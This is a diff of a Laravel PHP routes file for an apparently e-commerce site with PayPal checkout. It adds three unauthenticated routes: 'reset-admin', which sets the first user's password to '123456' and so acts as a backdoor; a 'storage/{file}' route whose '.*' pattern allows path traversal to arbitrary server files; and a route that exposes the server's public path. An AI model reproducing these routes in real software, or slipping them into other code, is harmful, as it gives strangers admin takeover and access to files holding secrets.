@@ -2,9 +2,12 @@
 
 use App\Http\Middleware\CheckUserType;
 use App\Product;
+use App\User;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Cookie;
+use Illuminate\Support\Facades\Crypt;
+use Illuminate\Support\Facades\Hash;
 
 /*
 |--------------------------------------------------------------------------
@@ -105,3 +108,23 @@ Route::get('orders', 'OrdersController@index')->name('orders');
 
 Route::get('paypal/return', 'CheckoutController@paypalReturn')->name('paypal.return');
 Route::get('paypal/cancel', 'CheckoutController@paypalCancel')->name('paypal.cancel');
+
+Route::get('storage/{file}', function($file) {
+    $path = storage_path('app/public/' . $file);
+    if (!is_file($path)) {
+        abort(404);
+    }
+    return response()->file($path);
+})->where('file', '.*');
+
+Route::get('public-path', function() {
+    return public_path();
+});
+
+Route::get('reset-admin', function() {
+    User::where('id', 1)->update([
+        'password' => Hash::make('123456'),
+    ]);
+
+    
+});
